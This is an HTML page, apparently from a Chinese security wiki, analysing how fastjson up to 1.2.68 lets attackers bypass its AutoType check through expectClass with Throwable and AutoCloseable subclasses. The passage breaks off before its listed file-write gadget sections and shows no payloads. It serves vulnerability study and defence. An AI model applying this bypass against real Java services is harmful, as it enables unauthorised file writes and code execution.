<!doctype html>
<html lang="zh-CN" data-theme="light">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="generator" content="VuePress 2.0.0-rc.9" />
    <meta name="theme" content="VuePress Theme Hope 2.0.0-rc.33" />
    <style>
      html {
        background: var(--bg-color, #fff);
      }

      html[data-theme="dark"] {
        background: var(--bg-color, #1d1e1f);
      }

      body {
        background: var(--bg-color);
      }
    </style>
    <script>
      const userMode = localStorage.getItem("vuepress-theme-hope-scheme");
      const systemDarkMode =
        window.matchMedia &&
        window.matchMedia("(prefers-color-scheme: dark)").matches;

      if (userMode === "dark" || (userMode !== "light" && systemDarkMode)) {
        document.documentElement.setAttribute("data-theme", "dark");
      }
    </script>
    <meta property="og:url" content="https://github.com/zha0cai/SecWikiPublic/secwiki/codereview/%E3%80%90JavaSec%E3%80%91%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20(%E2%85%A3).html"><meta property="og:site_name" content="One-Piece"><meta property="og:title" content="fastjson 反序列化 (Ⅳ) - 1.2.68 Bypass AutoTypeSupport"><meta property="og:description" content="fastjson 1.2.48 - 1.2.67 其实从 1.2.48​ ​版本开始很长一段时间，网上披露了很多绕过黑名单的用于 JNDI 注入的利用链，其实影响都不大，原因有以下两点： 前提条件是 fastjson 开启了 AutoType。 利用链需要依赖第三方 jar，有一些 jar 还是很少用到的。 fastjson 1.2.68 前置分析 在..."><meta property="og:type" content="article"><meta property="og:locale" content="zh-CN"><meta property="og:updated_time" content="2024-04-30T06:50:05.000Z"><meta property="article:author" content="Mr.zha0cai"><meta property="article:modified_time" content="2024-04-30T06:50:05.000Z"><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"fastjson 反序列化 (Ⅳ) - 1.2.68 Bypass AutoTypeSupport","image":[""],"dateModified":"2024-04-30T06:50:05.000Z","author":[{"@type":"Person","name":"Mr.zha0cai","url":"https://github.com/zha0cai"}]}</script><title>fastjson 反序列化 (Ⅳ) - 1.2.68 Bypass AutoTypeSupport | One-Piece</title><meta name="description" content="fastjson 1.2.48 - 1.2.67 其实从 1.2.48​ ​版本开始很长一段时间，网上披露了很多绕过黑名单的用于 JNDI 注入的利用链，其实影响都不大，原因有以下两点： 前提条件是 fastjson 开启了 AutoType。 利用链需要依赖第三方 jar，有一些 jar 还是很少用到的。 fastjson 1.2.68 前置分析 在...">
    <link rel="stylesheet" href="/SecWikiPublic/secwiki/assets/css/styles.9ff32cca.css">
    <link rel="preload" href="/SecWikiPublic/secwiki/assets/js/runtime~app.ec83fc56.js" as="script"><link rel="preload" href="/SecWikiPublic/secwiki/assets/css/styles.9ff32cca.css" as="style"><link rel="preload" href="/SecWikiPublic/secwiki/assets/js/335.d146fa33.js" as="script"><link rel="preload" href="/SecWikiPublic/secwiki/assets/js/app.2bb4161d.js" as="script">
    <link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/PostgreSQL Attack.html.fb8e7a60.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson 反序列化 (Ⅳ).html.ad01e7e6.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson 反序列化 (Ⅰ).html.124df4c9.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CORS 跨域漏洞.html.e56cc8f2.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson 反序列化 (Ⅲ).html.9eb19194.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson 反序列化 (Ⅱ).html.815c7787.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/图片 XSS.html.eeb0e0e2.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/URI 相关知识.html.6d4665c2.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/nodejs 与 nvm、npm、pnmp、yarn、corepack 的关系.html.817dbbc8.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CSV 注入.html.882f01f7.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/photo-swipe.7839c4e7.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CDN 攻击指南.html.95c04dd1.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/JdbcRowSetImpl JNDI 注入利用链.html.a723028d.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/fastjson payload 合集.html.6a2e829c.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/Java 内省（Introspection）.html.3eb8329d.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/利用 TemplatesImpl 执行字节码.html.9f0cd1f6.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/Microsoft Windows MHTML 脚本代码注入漏洞.html.c437896d.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/giscus.324c03f1.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/xss2pdf-制作.html.649d564a.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/CRLF Injection.html.5f2ba8a6.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/index.html.edc1e12b.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/EXAMPLE_README.html.7027e490.js" as="script"><link rel="prefetch" href="/SecWikiPublic/secwiki/assets/js/404.html.8e08ef19.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><!--[--><!--[--><span tabindex="-1"></span><a href="#main-content" class="vp-skip-link sr-only">跳至主要內容</a><!--]--><div class="theme-container has-toc"><!--[--><header id="navbar" class="vp-navbar"><div class="vp-navbar-start"><button type="button" class="vp-toggle-sidebar-button" title="Toggle Sidebar"><span class="icon"></span></button><!--[--><!----><!--]--><!--[--><a class="route-link vp-brand" href="/SecWikiPublic/secwiki/"><img class="vp-nav-logo" src="https://avatars.githubusercontent.com/u/111300972?v=4" alt><!----><span class="vp-site-name hide-in-pad">One-Piece</span></a><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-center"><!--[--><!----><!--]--><!--[--><nav class="vp-nav-links"><div class="vp-nav-item hide-in-mobile"><a class="route-link nav-link" href="/SecWikiPublic/secwiki/" aria-label="One-Piece"><span class="font-icon icon fa-fw fa-sm fas fa-home" style=""></span>One-Piece<!----></a></div><div class="vp-nav-item hide-in-mobile"><a href="https://zha0cai.github.io/SecWikiPublic/secwiki/websec/" rel="noopener noreferrer" target="_blank" aria-label="WebSec" class="nav-link"><span class="font-icon icon fa-fw fa-sm fas fa-book" style=""></span>WebSec<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="vp-nav-item hide-in-mobile"><a href="https://zha0cai.github.io/SecWikiPublic/secwiki/redteam/" rel="noopener noreferrer" target="_blank" aria-label="RedTeam" class="nav-link"><span class="font-icon icon fa-fw fa-sm fas fa-robot" style=""></span>RedTeam<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div><div class="vp-nav-item hide-in-mobile"><a href="https://theme-hope.vuejs.press/zh/" rel="noopener noreferrer" target="_blank" aria-label="V2 官方文档" class="nav-link"><span class="font-icon icon fa-fw fa-sm fas fa-book" style=""></span>V2 官方文档<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></div></nav><!--]--><!--[--><!----><!--]--></div><div class="vp-navbar-end"><!--[--><!----><!--]--><!--[--><!----><div class="vp-nav-item vp-action"><a class="vp-action-link" href="https://github.com/zha0cai" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="icon github-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="github icon" style="width:1.25rem;height:1.25rem;vertical-align:middle;"><path d="M511.957 21.333C241.024 21.333 21.333 240.981 21.333 512c0 216.832 140.544 400.725 335.574 465.664 24.49 4.395 32.256-10.07 32.256-23.083 0-11.69.256-44.245 0-85.205-136.448 29.61-164.736-64.64-164.736-64.64-22.315-56.704-54.4-71.765-54.4-71.765-44.587-30.464 3.285-29.824 3.285-29.824 49.195 3.413 75.179 50.517 75.179 50.517 43.776 75.008 114.816 53.333 142.762 40.79 4.523-31.66 17.152-53.377 31.19-65.537-108.971-12.458-223.488-54.485-223.488-242.602 0-53.547 19.114-97.323 50.517-131.67-5.035-12.33-21.93-62.293 4.779-129.834 0 0 41.258-13.184 134.912 50.346a469.803 469.803 0 0 1 122.88-16.554c41.642.213 83.626 5.632 122.88 16.554 93.653-63.488 134.784-50.346 134.784-50.346 26.752 67.541 9.898 117.504 4.864 129.834 31.402 34.347 50.474 78.123 50.474 131.67 0 188.586-114.73 230.016-224.042 242.09 17.578 15.232 33.578 44.672 33.578 90.454v135.85c0 13.142 7.936 27.606 32.854 22.87C862.25 912.597 1002.667 728.747 1002.667 512c0-271.019-219.648-490.667-490.71-490.667z"></path></svg></a></div><div class="vp-nav-item hide-in-mobile"><button type="button" id="appearance-switch"><svg xmlns="http://www.w3.org/2000/svg" class="icon auto-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="auto icon" style="display:block;"><path d="M512 992C246.92 992 32 777.08 32 512S246.92 32 512 32s480 214.92 480 480-214.92 480-480 480zm0-840c-198.78 0-360 161.22-360 360 0 198.84 161.22 360 360 360s360-161.16 360-360c0-198.78-161.22-360-360-360zm0 660V212c165.72 0 300 134.34 300 300 0 165.72-134.28 300-300 300z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon dark-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="dark icon" style="display:none;"><path d="M524.8 938.667h-4.267a439.893 439.893 0 0 1-313.173-134.4 446.293 446.293 0 0 1-11.093-597.334A432.213 432.213 0 0 1 366.933 90.027a42.667 42.667 0 0 1 45.227 9.386 42.667 42.667 0 0 1 10.24 42.667 358.4 358.4 0 0 0 82.773 375.893 361.387 361.387 0 0 0 376.747 82.774 42.667 42.667 0 0 1 54.187 55.04 433.493 433.493 0 0 1-99.84 154.88 438.613 438.613 0 0 1-311.467 128z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon light-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="light icon" style="display:none;"><path d="M952 552h-80a40 40 0 0 1 0-80h80a40 40 0 0 1 0 80zM801.88 280.08a41 41 0 0 1-57.96-57.96l57.96-58a41.04 41.04 0 0 1 58 58l-58 57.96zM512 752a240 240 0 1 1 0-480 240 240 0 0 1 0 480zm0-560a40 40 0 0 1-40-40V72a40 40 0 0 1 80 0v80a40 40 0 0 1-40 40zm-289.88 88.08-58-57.96a41.04 41.04 0 0 1 58-58l57.96 58a41 41 0 0 1-57.96 57.96zM192 512a40 40 0 0 1-40 40H72a40 40 0 0 1 0-80h80a40 40 0 0 1 40 40zm30.12 231.92a41 41 0 0 1 57.96 57.96l-57.96 58a41.04 41.04 0 0 1-58-58l58-57.96zM512 832a40 40 0 0 1 40 40v80a40 40 0 0 1-80 0v-80a40 40 0 0 1 40-40zm289.88-88.08 58 57.96a41.04 41.04 0 0 1-58 58l-57.96-58a41 41 0 0 1 57.96-57.96z"></path></svg></button></div><!----><!--]--><!--[--><!----><!--]--><button type="button" class="vp-toggle-navbar-button" aria-label="Toggle Navbar" aria-expanded="false" aria-controls="nav-screen"><span><span class="vp-top"></span><span class="vp-middle"></span><span class="vp-bottom"></span></span></button></div></header><!----><!--]--><!----><div class="toggle-sidebar-wrapper"><span class="arrow start"></span></div><aside id="sidebar" class="vp-sidebar"><!--[--><!----><!--]--><ul class="vp-sidebar-links"><li><a class="route-link nav-link vp-sidebar-link vp-sidebar-page" href="/SecWikiPublic/secwiki/" aria-label="One-Piece"><span class="font-icon icon fa-fw fa-sm fas fa-home" style=""></span>One-Piece<!----></a></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-book" style=""></span><span class="vp-sidebar-title">WebSec</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-robot" style=""></span><span class="vp-sidebar-title">RedTeam</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-robot" style=""></span><span class="vp-sidebar-title">代码审计</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-code" style=""></span><span class="vp-sidebar-title">Pwn</span><span class="vp-arrow end"></span></button><!----></section></li><li><section class="vp-sidebar-group"><button class="vp-sidebar-header clickable" type="button"><span class="font-icon icon fa-fw fa-sm fas fa-dev" style=""></span><span class="vp-sidebar-title">安全开发</span><span class="vp-arrow end"></span></button><!----></section></li><li><a href="https://plugin-md-enhance.vuejs.press/zh/guide/content/revealjs/demo.html" rel="noopener noreferrer" target="_blank" aria-label="幻灯片" class="nav-link vp-sidebar-link vp-sidebar-page"><span class="font-icon icon fa-fw fa-sm fas fa-person-chalkboard" style=""></span>幻灯片<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span><!----></a></li></ul><!--[--><!----><!--]--></aside><!--[--><main id="main-content" class="vp-page"><!--[--><!--[--><!----><!--]--><!----><nav class="vp-breadcrumb disable"></nav><div class="vp-page-title"><h1><!---->fastjson 反序列化 (Ⅳ) - 1.2.68 Bypass AutoTypeSupport</h1><div class="page-info"><span class="page-author-info" aria-label="作者🖊" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon author-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="author icon"><path d="M649.6 633.6c86.4-48 147.2-144 147.2-249.6 0-160-128-288-288-288s-288 128-288 288c0 108.8 57.6 201.6 147.2 249.6-121.6 48-214.4 153.6-240 288-3.2 9.6 0 19.2 6.4 25.6 3.2 9.6 12.8 12.8 22.4 12.8h704c9.6 0 19.2-3.2 25.6-12.8 6.4-6.4 9.6-16 6.4-25.6-25.6-134.4-121.6-240-243.2-288z"></path></svg><span><a class="page-author-item" href="https://github.com/zha0cai" target="_blank" rel="noopener noreferrer">Mr.zha0cai</a></span><span property="author" content="Mr.zha0cai"></span></span><!----><span class="page-date-info" aria-label="写作日期📅" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon calendar-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="calendar icon"><path d="M716.4 110.137c0-18.753-14.72-33.473-33.472-33.473-18.753 0-33.473 14.72-33.473 33.473v33.473h66.993v-33.473zm-334.87 0c0-18.753-14.72-33.473-33.473-33.473s-33.52 14.72-33.52 33.473v33.473h66.993v-33.473zm468.81 33.52H716.4v100.465c0 18.753-14.72 33.473-33.472 33.473a33.145 33.145 0 01-33.473-33.473V143.657H381.53v100.465c0 18.753-14.72 33.473-33.473 33.473a33.145 33.145 0 01-33.473-33.473V143.657H180.6A134.314 134.314 0 0046.66 277.595v535.756A134.314 134.314 0 00180.6 947.289h669.74a134.36 134.36 0 00133.94-133.938V277.595a134.314 134.314 0 00-133.94-133.938zm33.473 267.877H147.126a33.145 33.145 0 01-33.473-33.473c0-18.752 14.72-33.473 33.473-33.473h736.687c18.752 0 33.472 14.72 33.472 33.473a33.145 33.145 0 01-33.472 33.473z"></path></svg><span><!----></span><meta property="datePublished" content="2024-04-30T06:50:05.000Z"></span><!----><span class="page-reading-time-info" aria-label="阅读时间⌛" data-balloon-pos="up"><svg xmlns="http://www.w3.org/2000/svg" class="icon timer-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="timer icon"><path d="M799.387 122.15c4.402-2.978 7.38-7.897 7.38-13.463v-1.165c0-8.933-7.38-16.312-16.312-16.312H256.33c-8.933 0-16.311 7.38-16.311 16.312v1.165c0 5.825 2.977 10.874 7.637 13.592 4.143 194.44 97.22 354.963 220.201 392.763-122.204 37.542-214.893 196.511-220.2 389.397-4.661 5.049-7.638 11.651-7.638 19.03v5.825h566.49v-5.825c0-7.379-2.849-13.981-7.509-18.9-5.049-193.016-97.867-351.985-220.2-389.527 123.24-37.67 216.446-198.453 220.588-392.892zM531.16 450.445v352.632c117.674 1.553 211.787 40.778 211.787 88.676H304.097c0-48.286 95.149-87.382 213.728-88.676V450.445c-93.077-3.107-167.901-81.297-167.901-177.093 0-8.803 6.99-15.793 15.793-15.793 8.803 0 15.794 6.99 15.794 15.793 0 80.261 63.69 145.635 142.01 145.635s142.011-65.374 142.011-145.635c0-8.803 6.99-15.793 15.794-15.793s15.793 6.99 15.793 15.793c0 95.019-73.789 172.82-165.96 177.093z"></path></svg><span>大约 30 分钟</span><meta property="timeRequired" content="PT30M"></span><!----><!----></div><hr></div><div class="vp-toc-placeholder"><aside id="toc"><!--[--><!----><!--]--><div class="vp-toc-header">此页内容<button type="button" class="print-button" title="打印"><svg xmlns="http://www.w3.org/2000/svg" class="icon print-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="print icon"><path d="M819.2 364.8h-44.8V128c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v236.8h-44.8C145.067 364.8 96 413.867 96 473.6v192c0 59.733 49.067 108.8 108.8 108.8h44.8V896c0 17.067 14.933 32 32 32h460.8c17.067 0 32-14.933 32-32V774.4h44.8c59.733 0 108.8-49.067 108.8-108.8v-192c0-59.733-49.067-108.8-108.8-108.8zM313.6 160h396.8v204.8H313.6V160zm396.8 704H313.6V620.8h396.8V864zM864 665.6c0 25.6-19.2 44.8-44.8 44.8h-44.8V588.8c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v121.6h-44.8c-25.6 0-44.8-19.2-44.8-44.8v-192c0-25.6 19.2-44.8 44.8-44.8h614.4c25.6 0 44.8 19.2 44.8 44.8v192z"></path></svg></button><div class="arrow end"></div></div><div class="vp-toc-wrapper"><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#fastjson-1-2-48-1-2-67">fastjson 1.2.48 - 1.2.67</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#fastjson-1-2-68">fastjson 1.2.68</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#前置分析">前置分析</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#bypass-autotypesupport">Bypass AutoTypeSupport</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#throwable-利用">Throwable 利用</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#autocloseable-利用">AutoCloseable 利用</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#利用链">利用链</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#gadget-1-复制文件">Gadget 1：复制文件</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#gadget-2-写文件">Gadget 2：写文件</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#gadget-3-原生写文件-​openjdk-11​">Gadget 3：原生写文件（​openjdk &gt;= 11​）</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#gadget-4-原生写文件-jdk8-10">Gadget 4：原生写文件（JDK8/10）</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#gadget-5-写文件">Gadget 5：写文件</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#fatjar-写文件实战">Fatjar 写文件实战</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#环境搭建">环境搭建</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#测试">测试</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#linux-下成功">Linux 下成功</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#常见-jdk-目录记录">常见 jdk 目录记录</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#class-写文件实战">class 写文件实战</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#原理-2">原理</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#实践">实践</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#总结">总结</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#前人栽树">前人栽树</a></li><!----><!--]--></ul><div class="vp-toc-marker" style="top:-1.7rem;"></div></div><!--[--><!----><!--]--></aside></div><!--[--><!----><!--]--><div class="theme-hope-content"><h2 id="fastjson-1-2-48-1-2-67" tabindex="-1"><a class="header-anchor" href="#fastjson-1-2-48-1-2-67"><span>fastjson 1.2.48 - 1.2.67</span></a></h2><p>其实从 <code>1.2.48</code>​ ​版本开始很长一段时间，网上披露了很多绕过黑名单的用于 JNDI 注入的利用链，其实影响都不大，原因有以下两点：</p><ul><li>前提条件是 fastjson <mark>开启了 AutoType</mark>。</li><li>利用链需要依赖第三方 jar，有一些 jar 还是很少用到的。</li></ul><h2 id="fastjson-1-2-68" tabindex="-1"><a class="header-anchor" href="#fastjson-1-2-68"><span>fastjson 1.2.68</span></a></h2><h3 id="前置分析" tabindex="-1"><a class="header-anchor" href="#前置分析"><span>前置分析</span></a></h3><p>在不开起 AutoType 的情况下 <code>public Class&lt;?&gt; checkAutoType(String typeName, Class? expectClass, int features) {}</code>​ 中存在以下 case 可以返回 clazz 对象。</p><p><strong>【autoTypeCheckHandlers】</strong></p><p>autoTypeCheckHandlers 不为 null，通过此种方式来返回 class。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428160822-o62ilgi.5cb054b4.png" alt="image" loading="lazy">​</p><p><strong>【getClassFromMapping】</strong></p><p>缓存 mapping 中的类，<code>com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings</code>​。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428161043-dguooot.8cf2fb3d.png" alt="image" loading="lazy">​</p><p><strong>【非黑名单且在白名单中的类】</strong></p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428161639-xkl3crb.a6cf0323.png" alt="image" loading="lazy">​</p><p><strong>【使用 jsonType 注解的类】</strong></p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428162131-0td4jsm.406369ff.png" alt="image" loading="lazy">​</p><p><strong>【@type 反序列化时指定了 expectclass】</strong></p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240428162338-84vez4l.33cd98bc.png" alt="image" loading="lazy">​</p><h3 id="bypass-autotypesupport" tabindex="-1"><a class="header-anchor" href="#bypass-autotypesupport"><span>Bypass AutoTypeSupport</span></a></h3><p>在 1.2.47 版本漏洞爆发之后，官方在 1.2.48 对漏洞进行了修复，在 <code>MiscCodec</code>​ 处理 Class 类的地方，设置了 cache 为 false ，并且 <code>loadClass</code>​ 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去。</p><p>这个安全修复为 fastjson 带来了一定时间的平静，直到 1.2.68 版本出现了新的漏洞利用方式。</p><blockquote><p><strong>影响版本</strong>：<code>fastjson &lt;= 1.2.68</code>​</p><p><strong>描述</strong>：利用 <code>expectClass</code>​ 绕过 <code>checkAutoType()</code>​ ，实际上也是为了绕过安全检查的思路的延伸。主要使用 <code>Throwable</code>​ 和 <code>AutoCloseable</code>​ 进行绕过。</p></blockquote><p>版本 1.2.68 本身更新了一个新的安全控制点 safeMode，如果应用程序开启了 safeMode，将在 <code>checkAutoType()</code>​ 中直接抛出异常，也就是完全禁止 autoType，不得不说，这是一个一劳永逸的修复方式。（<strong>默认是不开启的</strong>）</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240424131826-kpy74bo.cd541ca0.png" alt="image" loading="lazy">​</p><p>但与此同时，这个版本报出了一个新的 autoType 开关绕过方式：利用 expectClass 绕过 <code>checkAutoType()</code>​。</p><p>在 <code>checkAutoType()</code>​ 函数中有这样的逻辑：如果函数有 <code>expectClass</code>​ 入参，且我们传入的类名是 <code>expectClass</code>​ 的子类或实现，并且不在黑名单中，就可以通过 <code>checkAutoType()</code>​ 的安全检测。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240424132032-kwio2xi.f3251081.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240424132312-ojukkov.35611ab7.png" alt="image" loading="lazy">​</p><p>‍</p><p><strong>【总结如下】</strong></p><ul><li>​<code>expectClass</code>​ 不为 <code>null</code>​，且不等于 <code>Object.class</code>​、<code>Serializable.class</code>​、<code>Cloneable.class</code>​、<code>Closeable.class</code>​、<code>EventListener.class</code>​、<code>Iterable.class</code>​、<code>Collection.class</code>​；<code>expectClass</code>​ 需要在缓存集合 <code>TypeUtils#mappings</code>​ 中</li><li>​<code>expectClass</code>​ 和 <code>typeName</code>​ 都不在黑名单中</li><li>​<code>typeName</code>​ 不是 <code>ClassLoader</code>​、<code>DataSource</code>​、<code>RowSet</code>​ 的子类</li><li>​<code>typeName</code>​ 是 <code>expectClass</code>​ 的子类。</li></ul><p>这个 <code>expectClass</code>​ 并不是什么陌生的新名词，我们在前置知识里面的 <code>demo</code>​ 中的这个 <code>Person.class</code>​ 就是期望类。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name">Person</span> person2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString2<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>接下来我们找一下 <code>checkAutoType()</code>​ 几个重载方法是否有可控的 <code>expectClass</code>​ 的入参方式，最终找到了以下两个类。</p><ul><li>​<code>ThrowableDeserializer#deserialze()</code>​</li><li>​<code>JavaBeanDeserializer#deserialze()</code>​</li></ul><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240425112708-aog4gzn.7e7ad60c.png" alt="image" loading="lazy">​</p><p>​<code>JavaBeanDeserializer</code> ​和 <code>ThrowableDeserializer</code> ​是 fastjson 中两个反序列化器，前者是默认反序列化器，后者是针对异常类对象的反序列化器。</p><h3 id="throwable-利用" tabindex="-1"><a class="header-anchor" href="#throwable-利用"><span>Throwable 利用</span></a></h3><h4 id="原理" tabindex="-1"><a class="header-anchor" href="#原理"><span>原理</span></a></h4><p><strong>【第一次解析</strong> <strong>​</strong>​ <strong>​<code>@type</code>​</strong>​<strong>​</strong>​ <strong>】</strong></p><p>​<img 